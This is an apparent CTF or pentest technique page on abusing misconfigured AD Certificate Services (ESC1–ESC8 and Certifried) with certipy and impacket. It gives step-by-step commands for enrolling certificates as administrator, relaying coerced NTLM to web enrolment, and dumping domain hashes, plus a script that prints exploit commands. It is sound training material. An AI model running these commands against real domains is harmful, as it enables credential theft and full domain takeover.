---
title: "AD CS Abuse - ESC1 to ESC8 with Certipy"
category: misc
subcategory: active-directory
type: technique
tags: [adcs, certipy, esc1, esc8, certificate-services, pkinit, ntlm-relay, unpac-the-hash, active-directory, impacket, certifried, privilege-escalation]
difficulty: hard
summary: "Misconfigured certificate templates and CA settings let a low-priv user enrol a cert as any account; certipy finds and abuses ESC1-ESC8 and authenticates with the cert."
when_to_use:
  - "A Certificate Authority / AD CS is present (certipy find reports templates)"
  - "You have a low-privileged domain credential and need escalation to Domain Admin"
  - "certipy find -vulnerable flags an ESC condition"
  - "Web enrolment (/certsrv) is reachable and you can coerce authentication (ESC8)"
cves: [CVE-2022-26923]
tools: [certipy, impacket, netexec]
related: [ad-credential-attacks, ad-acl-delegation-abuse, ad-enumeration-bloodhound, net-mitm]
---

## TL;DR

AD Certificate Services issues certificates that can be used to authenticate (PKINIT). If a template
or the CA is misconfigured, a low-privileged user can enrol a certificate *as a Domain Admin* and
then log in as them. `certipy` finds the misconfiguration (ESC1-ESC8) and performs both the enrol
and the authentication.

## Recognise it

- A Certificate Authority in the domain; `certipy find` lists templates and CA settings.
- `certipy find -vulnerable` reports ESCx findings.
- Web enrolment endpoints `/certsrv/certfnsh.asp` or the RPC enrol interface are reachable.

## Theory

A certificate that has a client-authentication EKU and lets the *requester choose the subject* is a
skeleton key: request one for `administrator`, then authenticate with it. Different ESCs are different
ways that "requester chooses who the cert is for" gets allowed -- via template flags, EKUs, ACLs, a
CA-wide flag, or an NTLM relay to the enrolment web service.

## Attack

### Step 0 -- enumerate

```bash
# Find all templates + CAs, and highlight the vulnerable ones
certipy find -u attacker@corp.local -p 'AttP@ss' -dc-ip 10.10.10.5 -stdout
certipy find -u attacker@corp.local -p 'AttP@ss' -dc-ip 10.10.10.5 -vulnerable -stdout
certipy find -u attacker@corp.local -p 'AttP@ss' -dc-ip 10.10.10.5 -enabled -stdout
```

### ESC1 -- enrollee-supplied subject + client-auth EKU

Template lets the requester specify the SubjectAltName and has an authentication EKU.

```bash
# Request a cert as the domain admin by supplying the UPN
certipy req -u attacker@corp.local -p 'AttP@ss' -dc-ip 10.10.10.5 \
  -ca CORP-CA -template VulnTemplate -upn administrator@corp.local
# -> administrator.pfx
```

### ESC2 -- Any Purpose or SubCA EKU

Template has the "Any Purpose" EKU (or no EKU / SubCA), so the issued cert can be used for client
auth even though it was not explicitly meant for it. Request as ESC1, supplying the target UPN:

```bash
certipy req -u attacker@corp.local -p 'AttP@ss' -dc-ip 10.10.10.5 \
  -ca CORP-CA -template AnyPurposeTemplate -upn administrator@corp.local
```

### ESC3 -- Enrollment Agent certificate

Template grants the Certificate Request Agent EKU; get an agent cert, then request a cert *on behalf
of* another user.

```bash
# 1. Enrol an enrollment-agent certificate
certipy req -u attacker@corp.local -p 'AttP@ss' -dc-ip 10.10.10.5 -ca CORP-CA -template EnrollmentAgent
# 2. Use it to request a cert for the admin on a normal user template
certipy req -u attacker@corp.local -p 'AttP@ss' -dc-ip 10.10.10.5 -ca CORP-CA -template User \
  -on-behalf-of 'corp\administrator' -pfx attacker.pfx
```

### ESC4 -- template ACL is writable

You have write rights over the template object; make it ESC1-vulnerable, exploit, then restore.

```bash
# Overwrite the template config to make it enrollee-supplies-subject + client-auth
certipy template -u attacker@corp.local -p 'AttP@ss' -dc-ip 10.10.10.5 -template VulnTemplate -save-old
# Now exploit it as ESC1
certipy req -u attacker@corp.local -p 'AttP@ss' -dc-ip 10.10.10.5 -ca CORP-CA -template VulnTemplate \
  -upn administrator@corp.local
# Restore the original template afterwards
certipy template -u attacker@corp.local -p 'AttP@ss' -dc-ip 10.10.10.5 -template VulnTemplate -configuration VulnTemplate.json
```

### ESC5 -- CA object / PKI object ACL

You control an object the CA depends on (the CA computer object, the CA container, etc.). The path
varies; abuse the object right (often a computer takeover) then behave as the CA.

### ESC6 -- EDITF_ATTRIBUTESUBJECTALTNAME2 on the CA

The CA honours a requester-supplied SAN on *any* template. Request any client-auth template with a
UPN:

```bash
certipy req -u attacker@corp.local -p 'AttP@ss' -dc-ip 10.10.10.5 -ca CORP-CA -template User \
  -upn administrator@corp.local
```

### ESC7 -- ManageCA / ManageCertificates rights

You can administer the CA: add yourself as an officer, enable the SubCA template, request and then
approve your own cert.

```bash
# Add yourself as a CA officer (ManageCA)
certipy ca -u attacker@corp.local -p 'AttP@ss' -dc-ip 10.10.10.5 -ca CORP-CA -add-officer attacker
# Enable the SubCA template on the CA
certipy ca -u attacker@corp.local -p 'AttP@ss' -dc-ip 10.10.10.5 -ca CORP-CA -enable-template SubCA
# Request against SubCA (will be pending), then approve it as officer
certipy req -u attacker@corp.local -p 'AttP@ss' -dc-ip 10.10.10.5 -ca CORP-CA -template SubCA -upn administrator@corp.local
certipy ca -u attacker@corp.local -p 'AttP@ss' -dc-ip 10.10.10.5 -ca CORP-CA -issue-request <reqid>
certipy req -u attacker@corp.local -p 'AttP@ss' -dc-ip 10.10.10.5 -ca CORP-CA -retrieve <reqid>
```

### ESC8 -- NTLM relay to the CA web enrolment

The CA exposes HTTP(S) enrolment (`/certsrv`) without EPA/signing. Relay a coerced machine account's
NTLM auth to it and get a cert for that machine (usually a DC).

```bash
# certipy runs the relay listener targeting the web enrolment endpoint
certipy relay -target http://ca.corp.local -template DomainController
# impacket alternative
ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# Coerce the DC to authenticate to your relay (PetitPotam / PrinterBug)
PetitPotam.py -u attacker -p 'AttP@ss' -d corp.local ATTACKER_HOST ca.corp.local
# -> you receive dc01.pfx, then authenticate as the DC (below) and DCSync
```

### Using the certificate (authenticate + UnPAC-the-hash)

```bash
# Authenticate with the PFX: get a TGT and recover the NT hash from the PAC
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.5
# -> prints the TGT (saved to a .ccache) and the account's NT hash

# Use the ticket
export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass -just-dc corp.local/administrator@dc01.corp.local

# Or use the recovered NT hash directly
netexec smb dc01.corp.local -u administrator -H <recovered_nt_hash>
```

### CVE-2022-26923 (Certifried)

A low-priv user could set a controlled computer account's `dNSHostName` to match a DC and enrol a
machine certificate, then authenticate as that DC. Patched, but appears on unpatched CTF DCs.

```bash
# Add a computer, set its dNSHostName to the DC's, request a machine cert, authenticate
certipy account create -u attacker@corp.local -p 'AttP@ss' -dc-ip 10.10.10.5 -user 'EVIL' \
  -dns dc01.corp.local
certipy req -u 'EVIL$@corp.local' -p 'EvilP@ss' -dc-ip 10.10.10.5 -ca CORP-CA -template Machine
certipy auth -pfx evil.pfx -dc-ip 10.10.10.5
```

## Code

Parse `certipy find` (JSON output) and print, per template, which ESC it matches and the exact
exploit command.

```python
#!/usr/bin/env python3
"""Read certipy find JSON and print the matching ESC + exploit command per template.

Usage:
    certipy find -u u@d -p p -dc-ip IP -json -output out
    python3 esc_route.py out_Certipy.json attacker AttP@ss corp.local 10.10.10.5
"""
from __future__ import annotations

import json
import sys


def route(template: dict, u: str, p: str, dom: str, dc: str, ca: str, name: str) -> list[str]:
    """Return the ESC labels + commands a template's flags imply."""
    out: list[str] = []
    flags = json.dumps(template).lower()
    enrollee_supplies = "enrollee supplies subject" in flags or "enrollee_supplies_subject" in flags
    client_auth = "client authentication" in flags or "smart card logon" in flags or "any purpose" in flags
    if enrollee_supplies and client_auth:
        out.append(f"[ESC1] certipy req -u {u}@{dom} -p '{p}' -dc-ip {dc} -ca {ca} "
                   f"-template {name} -upn administrator@{dom}")
    if "any purpose" in flags or "subca" in flags:
        out.append(f"[ESC2] certipy req -u {u}@{dom} -p '{p}' -dc-ip {dc} -ca {ca} "
                   f"-template {name} -upn administrator@{dom}")
    if "certificate request agent" in flags:
        out.append(f"[ESC3] enrol agent cert then -on-behalf-of 'corp\\\\administrator'")
    return out


def main(argv: list[str]) -> int:
    if len(argv) < 6:
        print(__doc__)
        return 1
    path, u, p, dom, dc = argv[1:6]
    ca = argv[6] if len(argv) > 6 else "CORP-CA"
    with open(path, "r", encoding="utf-8") as fh:
        data = json.load(fh)
    templates = data.get("Certificate Templates", data.get("templates", {}))
    if isinstance(templates, dict):
        items = templates.items()
    else:
        items = enumerate(templates)
    found = False
    for key, tmpl in items:
        name = tmpl.get("Template Name", tmpl.get("name", str(key))) if isinstance(tmpl, dict) else str(key)
        cmds = route(tmpl if isinstance(tmpl, dict) else {}, u, p, dom, dc, ca, name)
        if cmds:
            found = True
            print(f"=== template: {name} ===")
            for c in cmds:
                print("  " + c)
    if not found:
        print("[*] no obvious ESC1-3 template match; run: certipy find -vulnerable -stdout")
    print("\n# After enrolling <target>.pfx:")
    print(f"certipy auth -pfx administrator.pfx -dc-ip {dc}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
```

## Variants & pitfalls

- **Run `certipy find -vulnerable` first** -- it labels the ESC for you; do not guess.
- **Clock skew** breaks PKINIT (`certipy auth`) -- sync to the DC.
- **ESC8 needs coercion** (PetitPotam/PrinterBug) and a relayable machine; the DC template is the
  usual target.
- **Restore ESC4 templates** you modify, or you leave the domain broken.
- **`certipy auth`** gives both a TGT and the NT hash -- either is enough to move on (DCSync, PtH).
- **PFX passwords.** certipy sets `-pfx` files; if it prompts for a password use the one it printed
  (often empty).
- **LDAPS vs LDAP.** Some enrolment/relay paths need LDAPS; certipy handles the transport but the
  service must be reachable.

## Tools

- `certipy` -- `find`, `req`, `template`, `ca`, `relay`, `account`, `auth`, `shadow`.
- `impacket` -- `ntlmrelayx.py --adcs`, `secretsdump.py`.
- `PetitPotam` / `printerbug.py` -- coercion for ESC8.
- `netexec` -- authenticate with the recovered hash.

## References

- The certipy documentation shipped with the tool (the ESC command reference).
- The original AD CS abuse research paper "Certified Pre-Owned" (concepts; no URL asserted here).
- CVE-2022-26923 (Certifried) advisory.
